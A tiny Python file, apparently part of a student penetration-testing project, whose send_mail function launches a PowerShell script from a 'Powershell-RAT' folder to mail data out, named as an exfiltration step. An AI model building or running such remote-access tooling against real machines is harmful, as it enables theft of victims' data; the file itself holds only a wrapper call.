# exfiltrate.py
import subprocess

def send_mail():
    subprocess.run([
        "powershell",
        "C:\\Users\\user\\Documents\\PFE\\Pentest\\tools\\Powershell-RAT\\Mail.ps1"
    ], shell=False)
    print("[+] Mail sent successfully.")
